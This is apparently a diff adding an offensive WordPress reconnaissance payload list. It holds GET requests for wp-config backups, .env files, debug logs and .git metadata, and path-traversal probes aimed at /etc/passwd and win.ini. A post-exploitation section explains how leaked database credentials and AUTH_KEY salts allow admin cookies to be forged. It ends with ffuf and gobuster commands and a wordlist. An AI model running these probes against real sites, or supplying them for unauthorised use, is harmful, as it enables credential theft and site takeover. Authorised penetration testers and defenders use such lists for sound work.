@@ -1,0 +1,140 @@
+# WordPress Config & File Discovery Payloads
+
+Most WP misconfigurations leak files via predictable paths. Run these after confirming WP.
+
+## Backup / leftover files (HIGH value - wp-config has DB creds)
+```
+GET /wp-config.php.bak
+GET /wp-config.php.save
+GET /wp-config.php.txt
+GET /wp-config.php.orig
+GET /wp-config.php~%
+GET /wp-config.php.old
+GET /wp-config.php.swp
+GET /wp-config.php#        (vim swap)
+GET /wp-config.bak
+GET /wp-config.txt
+GET /wp-config.php.1
+GET /wp-config.php.zip
+GET /wp-config.php.gz
+GET /wp-config.php.tar
+GET /db.sql
+GET /dump.sql
+GET /backup.sql
+GET /site.sql
+GET /database.sql
+GET /wp-content/backup-db/
+GET /wp-content/uploads/wp-import-export/
+GET /wp-content/db.php
+GET /.wp-config.php.swp
+```
+
+## Environment files & secrets
+```
+GET /.env
+GET /..%2f.env
+GET /wp-content/uploads/.env
+GET /config.php
+GET /configuration.php
+GET /env.js
+GET /credentials
+GET /wp-emergency.txt
+```
+
+## Logs & debug output
+```
+GET /wp-content/debug.log
+GET /wp-content/uploads/debug.log
+GET /debug.log
+GET /error_log
+GET /wp-content/uploads/2024/01/.admm/error.log
+```
+
+## Version disclosure (fingerprinting)
+```
+GET /wp-includes/version.php
+GET /license.txt
+GET /readme.html
+GET /wp-admin/install.php
+GET /wp-admin/upgrade.php
+```
+
+## File manager / upload paths used by plugins
+```
+GET /wp-content/uploads/
+GET /wp-content/uploads/2026/01/
+GET /wp-content/uploads/woocommerce_uploads/
+GET /wp-content/uploads/wp-file-manager-pro/
+GET /wp-content/plugins/simple-backup/
+GET /wp-content/aios-uploads/
+GET /wp-content/uploads/wpforms/
+```
+
+## Git / build artifacts
+```
+GET /.git/config
+GET /.git/HEAD
+GET /.git/index
+GET /.svn/entries
+GET .git/config
+GET /wp-content/.git/config
+```
+
+## Interesting includes (older plugins/themes)
+```
+GET /wp-content/plugins/akismet/readme.txt
+GET /wp-content/plugins/*/readme.txt
+GET /wp-content/themes/*/style.css
+GET /wp-content/themes/*/screenshot.png
+GET /wp-admin/admin-ajax.php
+GET /wp-admin/admin-post.php
+GET /xmlrpc.php
+```
+
+## Path traversal probes (framework bugs)
+```
+GET /wp-content/plugins/..%2f..%2f..%2f..%2fwindows/win.ini
+GET /wp-content/themes/..%2f..%2f..%2f..%2fetc/passwd
+GET /wp-content/plugins/../../../../../../etc/passwd
+GET /wp-admin/../../../../etc/passwd
+GET /wordpress/wp-content/plugins/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+```
+
+---
+
+## Post-exploitation nut-and-bolt list (if you get wp-config)
+- `DB_USER / DB_PASSWORD` → login to MySQL box (port 3306)
+- `AUTH_KEY`, `SECURE_AUTH_KEY`, `AUTH_SALT` → forge cookies to login as admin WITHOUT password (session hijack)
+- Use `AUTH_COOKIE` forgery: value = `username|expiration|hmac(AUTH_KEY)`
+
+## Tool automation
+```
+# ffuf config file discovery
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403
+
+# gobuster common wordlist
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50
+```
+
+## Wordlist suggestion (top paths only)
+```
+wp-config.php.bak
+wp-config.php.save
+wp-config.php.txt
+.env
+debug.log
+error_log
+wp-content/debug.log
+.git/config
+readme.html
+license.txt
+xmlrpc.php
+wp-login.php
+wp-admin/
+wp-json/
+wp-content/uploads/
+install.php
+upgrade.php
+backup.zip
+db.sql
+```
